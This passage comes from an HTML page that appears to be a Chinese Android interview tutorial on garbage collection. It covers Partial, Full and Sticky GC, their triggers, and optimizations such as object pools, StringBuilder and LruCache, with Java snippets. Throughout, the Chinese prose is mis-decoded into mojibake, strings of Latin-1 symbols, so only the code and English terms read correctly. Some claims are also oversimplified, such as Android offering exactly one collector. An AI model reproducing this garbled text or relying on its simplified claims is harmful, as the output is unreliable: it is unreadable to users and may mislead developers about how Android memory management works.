<li>å¹¶å‘å›æ”¶ï¼šåœ¨åå°çº¿ç¨‹æ‰§è¡Œï¼Œå‡å°‘ä¸»çº¿ç¨‹æš‚åœ</li>
<li>å¤åˆ¶ç®—æ³•ï¼šé€‚åˆå¹´è½»ä»£ï¼Œæ²¡æœ‰å†…å­˜ç¢ç‰‡</li>
<li>å¢é‡å›æ”¶ï¼šæŠŠå¤§é‡å›æ”¶å·¥ä½œåˆ†æˆå°ä»½ï¼Œé¿å…ä¸€æ¬¡æ€§å¡é¡¿å¤ªä¹…</li>
<li>å‹ç¼©å›æ”¶ï¼šå›æ”¶åæ•´ç†å†…å­˜ï¼Œé¿å…å†…å­˜ç¢ç‰‡</li>
</ul>
<p><strong>2. Androidæœ‰å‡ ç§åƒåœ¾å›æ”¶å™¨å¯é€‰ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>Androidæ²¡æœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼Œåªæœ‰ä¸€ç§ã€‚</strong></p>
<ul>
<li><strong>åªæœ‰ä¸€ç§</strong>ï¼šå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼ˆConcurrent Copyingï¼ŒCCï¼‰</li>
<li><strong>ç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨</strong>ï¼šå¼€å‘è€…ä¸éœ€è¦é€‰æ‹©ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨</li>
<li><strong>ä¸éœ€è¦é…ç½®</strong>ï¼šä¸åƒJVMéœ€è¦é…ç½®-XX:+UseXXXå‚æ•°</li>
</ul>
<p><strong>ä¸JVMçš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>JVM</strong>ï¼šæœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼ˆSerialã€Parallelã€CMSã€G1ã€ZGCã€Shenandoahç­‰ï¼‰ï¼Œéœ€è¦å¼€å‘è€…æ ¹æ®åº”ç”¨ç‰¹ç‚¹é€‰æ‹©</li>
<li><strong>Android</strong>ï¼šåªæœ‰ä¸€ç§ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨ï¼Œé’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆä¸éœ€è¦å¤šç§å¯é€‰ï¼Ÿ</strong></p>
<ul>
<li>Androidåº”ç”¨çš„ç‰¹ç‚¹ç›¸ä¼¼ï¼šéƒ½æ˜¯äº¤äº’å¼åº”ç”¨ï¼Œéœ€è¦ä½å»¶è¿Ÿ</li>
<li>ç³»ç»Ÿè‡ªåŠ¨ä¼˜åŒ–ï¼šé’ˆå¯¹Androidåœºæ™¯å·²ç»ä¼˜åŒ–å¥½äº†</li>
<li>ç®€åŒ–å¼€å‘ï¼šå¼€å‘è€…ä¸éœ€è¦äº†è§£å¤šç§æ”¶é›†å™¨çš„åŒºåˆ«å’Œé€‰æ‹©</li>
</ul>
<p><strong>3. Partial GCå’ŒFull GCçš„åŒºåˆ«ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>Partial GCï¼ˆéƒ¨åˆ†å›æ”¶ï¼‰ï¼š</strong></p>
<ul>
<li><strong>å›æ”¶èŒƒå›´</strong>ï¼šåªå›æ”¶å¹´è½»ä»£</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šå¹´è½»ä»£ç©ºé—´æ»¡äº†</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-å¤åˆ¶ç®—æ³•</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šçŸ­ï¼ˆå‡ æ¯«ç§’ï¼‰</li>
<li><strong>å¯¹åº”ç”¨å½±å“</strong>ï¼šå°ï¼Œç”¨æˆ·åŸºæœ¬æ„Ÿè§‰ä¸åˆ°</li>
<li><strong>é¢‘ç‡</strong>ï¼šé«˜ï¼ˆé¢‘ç¹è§¦å‘ï¼‰</li>
</ul>
<p><strong>Full GCï¼ˆå®Œå…¨å›æ”¶ï¼‰ï¼š</strong></p>
<ul>
<li><strong>å›æ”¶èŒƒå›´</strong>ï¼šå›æ”¶æ•´ä¸ªå †ï¼ˆå¹´è½»ä»£+è€å¹´ä»£ï¼‰</li>
<li><strong>è§¦å‘æ¡ä»¶</strong>ï¼šå †å†…å­˜ä¸è¶³ã€è€å¹´ä»£æ»¡äº†ã€æ˜¾å¼è°ƒç”¨System.gc()</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆè€å¹´ä»£ï¼‰</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šé•¿ï¼ˆå¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰</li>
<li><strong>å¯¹åº”ç”¨å½±å“</strong>ï¼šå¤§ï¼Œå¯èƒ½å¯¼è‡´åº”ç”¨å¡é¡¿ï¼Œç”¨æˆ·èƒ½æ„Ÿè§‰åˆ°</li>
<li><strong>é¢‘ç‡</strong>ï¼šä½ï¼ˆå¶å°”è§¦å‘ï¼‰</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦åŒºåˆ†Partial GCå’ŒFull GCï¼Ÿ</strong></p>
<ul>
<li>å¤§éƒ¨åˆ†å¯¹è±¡åœ¨å¹´è½»ä»£ï¼ŒPartial GCå¿«é€Ÿé«˜æ•ˆ</li>
<li>Full GCå›æ”¶æ•´ä¸ªå †ï¼Œè€—æ—¶é•¿ï¼Œåº”è¯¥å°½é‡é¿å…</li>
<li>åŒºåˆ†åå¯ä»¥ä¼˜åŒ–GCç­–ç•¥ï¼Œå‡å°‘Full GCçš„é¢‘ç‡</li>
</ul>
<p><strong>4. ä»€ä¹ˆæ—¶å€™ä¼šè§¦å‘Partial GCï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>è§¦å‘æ¡ä»¶ï¼šå¹´è½»ä»£ç©ºé—´æ»¡äº†</strong></p>
<p><strong>å…·ä½“åœºæ™¯ï¼š</strong></p>
<ul>
<li>åˆ›å»ºäº†å¾ˆå¤šæ–°å¯¹è±¡ï¼Œå¹´è½»ä»£å†…å­˜å¿«ç”¨å®Œäº†</li>
<li>åˆ†é…æ–°å¯¹è±¡æ—¶ï¼Œå¹´è½»ä»£ç©ºé—´ä¸å¤Ÿ</li>
<li>ç³»ç»Ÿæ£€æµ‹åˆ°å¹´è½»ä»£ç©ºé—´ä¸è¶³ï¼Œè‡ªåŠ¨è§¦å‘Partial GC</li>
</ul>
<p><strong>è§¦å‘æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ–°å¯¹è±¡åˆ†é…åœ¨å¹´è½»ä»£
<span class="hljs-bullet">2.</span> å¹´è½»ä»£ç©ºé—´é€æ¸è¢«å ç”¨
<span class="hljs-bullet">3.</span> å¹´è½»ä»£å¿«æ»¡æ—¶ï¼Œç³»ç»Ÿæ£€æµ‹åˆ°ç©ºé—´ä¸è¶³
<span class="hljs-bullet">4.</span> è‡ªåŠ¨è§¦å‘Partial GC
<span class="hljs-bullet">5.</span> åªæ¸…ç†å¹´è½»ä»£ï¼Œä¸æ¸…ç†è€å¹´ä»£
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>è§¦å‘å¿«ï¼Œæ‰§è¡Œå¿«</li>
<li>æš‚åœæ—¶é—´çŸ­ï¼ˆå‡ æ¯«ç§’ï¼‰</li>
<li>å¯¹åº”ç”¨å½±å“å°ï¼Œç”¨æˆ·åŸºæœ¬æ„Ÿè§‰ä¸åˆ°</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createManyObjects</span><span class="hljs-params">()</span> {
    List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());  <span class="hljs-comment">// åˆ›å»ºå¤§é‡å¯¹è±¡</span>
        <span class="hljs-comment">// å½“å¹´è½»ä»£å¿«æ»¡æ—¶ï¼Œè§¦å‘Partial GC</span>
    }
}
</code></pre>
<p><strong>5. ä»€ä¹ˆæ—¶å€™ä¼šè§¦å‘Full GCï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>è§¦å‘æ¡ä»¶ï¼šæ•´ä¸ªå †å†…å­˜ä¸è¶³</strong></p>
<p><strong>å…·ä½“åœºæ™¯ï¼š</strong></p>
<ol>
<li>
<p><strong>è€å¹´ä»£ç©ºé—´æ»¡äº†</strong></p>
<ul>
<li>é•¿æœŸå­˜æ´»çš„å¯¹è±¡å æ»¡äº†è€å¹´ä»£</li>
<li>æ— æ³•ç»§ç»­åˆ†é…æ–°å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>å †å†…å­˜æ•´ä½“ä¸è¶³</strong></p>
<ul>
<li>å¹´è½»ä»£å’Œè€å¹´ä»£éƒ½æ»¡äº†</li>
<li>æ— æ³•åˆ†é…æ–°å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>æ˜¾å¼è°ƒç”¨System.gc()</strong></p>
<ul>
<li>Androidä¸æ¨èä½¿ç”¨</li>
<li>ä¼šå¼ºåˆ¶è§¦å‘Full GCï¼Œå¯èƒ½å¯¼è‡´å¡é¡¿</li>
</ul>
</li>
</ol>
<p><strong>è§¦å‘æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> å †å†…å­˜ä¸è¶³ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡
<span class="hljs-bullet">2.</span> ç³»ç»Ÿæ£€æµ‹åˆ°å†…å­˜ä¸è¶³
<span class="hljs-bullet">3.</span> è§¦å‘Full GC
<span class="hljs-bullet">4.</span> å›æ”¶æ•´ä¸ªå †ï¼ˆå¹´è½»ä»£+è€å¹´ä»£ï¼‰
<span class="hljs-bullet">5.</span> å¦‚æœGCåè¿˜æ˜¯ä¸å¤Ÿï¼Œå¯èƒ½æŠ›å‡ºOutOfMemoryError
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æ‰§è¡Œæ…¢ï¼Œæš‚åœæ—¶é—´é•¿ï¼ˆå¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰</li>
<li>ä¼šæ¸…ç†æ•´ä¸ªå †ï¼ˆå¹´è½»ä»£+è€å¹´ä»£ï¼‰</li>
<li>å¯èƒ½å¯¼è‡´åº”ç”¨å¡é¡¿ï¼Œç”¨æˆ·èƒ½æ„Ÿè§‰åˆ°</li>
</ul>
<p><strong>å¦‚ä½•é¿å…Full GCï¼Ÿ</strong></p>
<ul>
<li>é¿å…å†…å­˜æ³„æ¼</li>
<li>å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li>ä¸è¦æ˜¾å¼è°ƒç”¨System.gc()</li>
<li>ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
</ul>
<p><strong>6. Sticky GCæ˜¯ä»€ä¹ˆï¼Ÿé€‚ç”¨åœºæ™¯ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>**Sticky GCï¼ˆç²˜æ€§å›æ”¶ï¼‰**æ˜¯ä¸€ç§å¿«é€Ÿæ¸…ç†æ–°åˆ†é…çš„çŸ­ç”Ÿå‘½å‘¨æœŸå¯¹è±¡çš„GCç±»å‹ã€‚</p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>åªæ¸…ç†æ–°å¯¹è±¡</strong>ï¼šåªæ¸…ç†åˆšåˆšåˆ›å»ºçš„æ–°å¯¹è±¡</li>
<li><strong>éå¸¸å¿«é€Ÿ</strong>ï¼šå‡ ä¹æ„Ÿè§‰ä¸åˆ°</li>
<li><strong>æš‚åœæ—¶é—´æçŸ­</strong>ï¼šå‡ æ¯«ç§’ç”šè‡³æ›´çŸ­</li>
<li><strong>ä¸“é—¨ä¼˜åŒ–é¢‘ç¹åˆ†é…å¯¹è±¡çš„åœºæ™¯</strong></li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ol>
<li>
<p><strong>åˆ—è¡¨å¿«é€Ÿæ»‘åŠ¨æ—¶</strong></p>
<ul>
<li>RecyclerViewæ»šåŠ¨æ—¶é¢‘ç¹åˆ›å»ºViewHolderã€ä¸´æ—¶å¯¹è±¡</li>
<li>Sticky GCå¿«é€Ÿæ¸…ç†è¿™äº›çŸ­ç”Ÿå‘½å‘¨æœŸå¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>åŠ¨ç”»æ’­æ”¾æ—¶</strong></p>
<ul>
<li>åŠ¨ç”»è¿‡ç¨‹ä¸­ä¸æ–­åˆ›å»ºä¸´æ—¶å¯¹è±¡</li>
<li>Sticky GCå¿«é€Ÿæ¸…ç†</li>
</ul>
</li>
<li>
<p><strong>UIæ¸²æŸ“æ—¶</strong></p>
<ul>
<li>UIæ¸²æŸ“æ—¶é¢‘ç¹åˆ›å»ºViewç›¸å…³å¯¹è±¡</li>
<li>Sticky GCå¿«é€Ÿæ¸…ç†</li>
</ul>
</li>
</ol>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> åº”ç”¨è¿è¡ŒæœŸé—´é¢‘ç¹åˆ›å»ºå¯¹è±¡
<span class="hljs-bullet">2.</span> ç³»ç»Ÿæ£€æµ‹åˆ°é¢‘ç¹åˆ†é…
<span class="hljs-bullet">3.</span> è§¦å‘Sticky GC
<span class="hljs-bullet">4.</span> åªæ¸…ç†åˆšåˆšåˆ›å»ºçš„æ–°å¯¹è±¡ï¼ˆçŸ­ç”Ÿå‘½å‘¨æœŸï¼‰
<span class="hljs-bullet">5.</span> å¿«é€Ÿå®Œæˆï¼Œå‡ ä¹ä¸å½±å“åº”ç”¨
</code></pre>
<p><strong>ä¸å…¶ä»–GCç±»å‹çš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>Partial GC</strong>ï¼šæ¸…ç†æ•´ä¸ªå¹´è½»ä»£ï¼Œæš‚åœæ—¶é—´å‡ æ¯«ç§’</li>
<li><strong>Full GC</strong>ï¼šæ¸…ç†æ•´ä¸ªå †ï¼Œæš‚åœæ—¶é—´å‡ ååˆ°å‡ ç™¾æ¯«ç§’</li>
<li><strong>Sticky GC</strong>ï¼šåªæ¸…ç†æ–°å¯¹è±¡ï¼Œæš‚åœæ—¶é—´æçŸ­ï¼Œå‡ ä¹æ„Ÿè§‰ä¸åˆ°</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">recyclerView.addOnScrollListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RecyclerView</span>.OnScrollListener() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onScrolled</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-type">int</span> dx, <span class="hljs-type">int</span> dy)</span> {
        <span class="hljs-comment">// æ»‘åŠ¨æ—¶é¢‘ç¹åˆ›å»ºå¯¹è±¡</span>
        <span class="hljs-comment">// è§¦å‘Sticky GCï¼Œå¿«é€Ÿæ¸…ç†</span>
        <span class="hljs-comment">// å‡ ä¹æ„Ÿè§‰ä¸åˆ°å¡é¡¿</span>
    }
});
</code></pre>
<h4 data-id="heading-79">6.2 Android GCå®è·µé¢˜ï¼ˆé‡ç‚¹ï¼‰</h4>
<h4 data-id="heading-80">6.2.1 GCä¼˜åŒ–</h4>
<p><strong>1. Android GCä¼˜åŒ–çš„ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Android GCä¼˜åŒ–çš„ä¸»è¦ç›®æ ‡æœ‰å››ä¸ªï¼š</p>
<p><strong>1. é™ä½GCæš‚åœæ—¶é—´ï¼ˆæœ€é‡è¦ï¼‰</strong></p>
<ul>
<li>GCæš‚åœä¼šå¯¼è‡´åº”ç”¨å¡é¡¿ï¼Œå½±å“ç”¨æˆ·ä½“éªŒ</li>
<li>ç›®æ ‡ï¼šå°½é‡å‡å°‘GCæš‚åœæ—¶é—´ï¼Œç‰¹åˆ«æ˜¯Full GC</li>
<li>æ–¹æ³•ï¼šé¿å…è§¦å‘Full GCï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</li>
</ul>
<p><strong>2. å‡å°‘å†…å­˜å ç”¨</strong></p>
<ul>
<li>Androidè®¾å¤‡å†…å­˜æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
<li>ç›®æ ‡ï¼šå‡å°‘å†…å­˜å ç”¨ï¼Œé™ä½å†…å­˜å‹åŠ›</li>
<li>æ–¹æ³•ï¼šåŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡ï¼Œé¿å…å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>3. æå‡åº”ç”¨æµç•…åº¦</strong></p>
<ul>
<li>GCä¼šå½±å“åº”ç”¨æ€§èƒ½ï¼Œå¯¼è‡´å¡é¡¿</li>
<li>ç›®æ ‡ï¼šæå‡åº”ç”¨æµç•…åº¦ï¼Œä¼˜åŒ–ç”¨æˆ·ä½“éªŒ</li>
<li>æ–¹æ³•ï¼šå‡å°‘GCé¢‘ç‡ï¼Œä¼˜åŒ–GCæ€§èƒ½</li>
</ul>
<p><strong>4. é¿å…ANRï¼ˆApplication Not Respondingï¼‰</strong></p>
<ul>
<li>é•¿æ—¶é—´GCå¯èƒ½å¯¼è‡´ANR</li>
<li>ç›®æ ‡ï¼šé¿å…ANRï¼Œä¿è¯åº”ç”¨å“åº”</li>
<li>æ–¹æ³•ï¼šå‡å°‘Full GCï¼Œä¼˜åŒ–GCæ€§èƒ½</li>
</ul>
<p><strong>ä¼˜åŒ–ä¼˜å…ˆçº§ï¼š</strong>
é™ä½GCæš‚åœæ—¶é—´ &gt; å‡å°‘å†…å­˜å ç”¨ &gt; æå‡æµç•…åº¦ &gt; é¿å…ANR</p>
<p><strong>2. å¦‚ä½•å‡å°‘GCé¢‘ç‡ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å‡å°‘GCé¢‘ç‡çš„æ ¸å¿ƒæ˜¯<strong>å‡å°‘å¯¹è±¡åˆ†é…</strong>ã€‚</p>
<p><strong>1. å¯¹è±¡å¤ç”¨ï¼ˆä½¿ç”¨å¯¹è±¡æ± ï¼‰</strong></p>
<ul>
<li>å¤ç”¨å¯¹è±¡ï¼Œé¿å…é¢‘ç¹åˆ›å»ºé”€æ¯</li>
<li>ç¤ºä¾‹ï¼šRecyclerViewçš„ViewHolderæ± ã€è‡ªå®šä¹‰å¯¹è±¡æ± </li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šé¢‘ç¹åˆ›å»ºå¯¹è±¡</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello"</span>);  <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»ºæ–°å¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šå¤ç”¨å¯¹è±¡</span>
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-comment">// å¤ç”¨åŒä¸€ä¸ªå¯¹è±¡</span>
}
</code></pre>
<p><strong>2. é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>ä½¿ç”¨StringBuilderè€Œä¸æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥</li>
<li>é¿å…åœ¨å¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡</li>
<li>ç¤ºä¾‹ï¼šå­—ç¬¦ä¸²æ‹¼æ¥ã€ä¸´æ—¶å¯¹è±¡</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå­—ç¬¦ä¸²æ‹¼æ¥</span>
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    result += i;  <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»ºæ–°Stringå¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨StringBuilder</span>
<span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    sb.append(i);  <span class="hljs-comment">// å¤ç”¨StringBuilder</span>
}
</code></pre>
<p><strong>3. ä½¿ç”¨åŸºæœ¬ç±»å‹æ›¿ä»£åŒ…è£…ç±»å‹</strong></p>
<ul>
<li>åŸºæœ¬ç±»å‹ä¸åˆ›å»ºå¯¹è±¡ï¼ŒåŒ…è£…ç±»å‹ä¼šåˆ›å»ºå¯¹è±¡</li>
<li>ç¤ºä¾‹ï¼šintè€Œä¸æ˜¯Integerï¼Œbooleanè€Œä¸æ˜¯Boolean</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šä½¿ç”¨åŒ…è£…ç±»å‹</span>
List&lt;Integer&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(i));  <span class="hljs-comment">// åˆ›å»ºIntegerå¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨åŸºæœ¬ç±»å‹æ•°ç»„</span>
<span class="hljs-type">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1000</span>];
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    array[i] = i;  <span class="hljs-comment">// ä¸åˆ›å»ºå¯¹è±¡</span>
}
</code></pre>
<p><strong>4. ä¼˜åŒ–æ•°æ®ç»“æ„</strong></p>
<ul>
<li>é€‰æ‹©åˆé€‚çš„é›†åˆç±»</li>
<li>åŠæ—¶æ¸…ç†é›†åˆï¼Œé¿å…é›†åˆæ³„æ¼</li>
</ul>
<p><strong>3. å¦‚ä½•å‡å°‘GCåœé¡¿æ—¶é—´ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å‡å°‘GCåœé¡¿æ—¶é—´çš„æ ¸å¿ƒæ˜¯<strong>é¿å…Full GC</strong>ã€‚</p>
<p><strong>1. é¿å…è§¦å‘Full GC</strong></p>
<ul>
<li>Full GCæš‚åœæ—¶é—´é•¿ï¼ˆå‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰ï¼Œä¼šå¯¼è‡´æ˜æ˜¾å¡é¡¿</li>
<li>æ–¹æ³•ï¼š
<ul>
<li>é¿å…å†…å­˜æ³„æ¼ï¼ˆå†…å­˜æ³„æ¼ä¼šå¯¼è‡´è€å¹´ä»£æ»¡ï¼Œè§¦å‘Full GCï¼‰</li>
<li>å‡å°‘è€å¹´ä»£å¯¹è±¡ï¼ˆå‡å°‘Full GCçš„è§¦å‘ï¼‰</li>
<li>ä¸è¦æ˜¾å¼è°ƒç”¨System.gc()ï¼ˆä¼šå¼ºåˆ¶è§¦å‘Full GCï¼‰</li>
</ul>
</li>
</ul>
<p><strong>2. å‡å°‘å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»ºå¯ä»¥å‡å°‘GCé¢‘ç‡</li>
<li>æ–¹æ³•ï¼šå¯¹è±¡å¤ç”¨ã€ä½¿ç”¨å¯¹è±¡æ± ã€é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
</ul>
<p><strong>3. ä¿®å¤å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>å†…å­˜æ³„æ¼ä¼šå¯¼è‡´å†…å­˜é€æ¸è¢«å ç”¨ï¼Œæœ€ç»ˆè§¦å‘Full GC</li>
<li>æ–¹æ³•ï¼šä½¿ç”¨LeakCanaryæ£€æµ‹ï¼Œä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>4. ä¼˜åŒ–GCæ€§èƒ½</strong></p>
<ul>
<li>è®©Partial GCæ›´é«˜æ•ˆ</li>
<li>æ–¹æ³•ï¼šå‡å°‘å¹´è½»ä»£å¯¹è±¡ï¼Œè®©Partial GCå¿«é€Ÿå®Œæˆ</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¯èƒ½å¯¼è‡´Full GC</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <span class="hljs-comment">// å†…å­˜æ³„æ¼</span>

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šé¿å…Full GC</span>
<span class="hljs-keyword">private</span> LruCache&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LruCache</span>&lt;&gt;(<span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);  <span class="hljs-comment">// æœ‰å¤§å°é™åˆ¶</span>
</code></pre>
<p><strong>4. å¦‚ä½•ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨æ€§èƒ½ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>åˆ—è¡¨æ»‘åŠ¨æ—¶é¢‘ç¹åˆ›å»ºå¯¹è±¡ï¼Œå®¹æ˜“è§¦å‘GCï¼Œå¯¼è‡´å¡é¡¿ã€‚</p>
<p><strong>1. ViewHolderå¤ç”¨</strong></p>
<ul>
<li>RecyclerViewçš„ViewHolderä¼šè‡ªåŠ¨å¤ç”¨ï¼Œé¿å…é¢‘ç¹åˆ›å»º</li>
<li>ç¡®ä¿ViewHolderæ­£ç¡®å¤ç”¨ï¼Œä¸è¦æ¯æ¬¡éƒ½åˆ›å»ºæ–°çš„</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RecyclerView</span>.Adapter&lt;MyAdapter.ViewHolder&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ViewHolder <span class="hljs-title function_">onCreateViewHolder</span><span class="hljs-params">(ViewGroup parent, <span class="hljs-type">int</span> viewType)</span> {
        <span class="hljs-comment">// ViewHolderå¤ç”¨ï¼Œé¿å…é¢‘ç¹åˆ›å»º</span>
        <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> LayoutInflater.from(parent.getContext())
            .inflate(R.layout.item, parent, <span class="hljs-literal">false</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewHolder</span>(view);
    }
}
</code></pre>
<p><strong>2. é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</strong></p>
<ul>
<li>onBindViewHolderåœ¨æ»‘åŠ¨æ—¶é¢‘ç¹è°ƒç”¨ï¼Œä¸è¦åœ¨è¿™é‡Œåˆ›å»ºå¯¹è±¡</li>
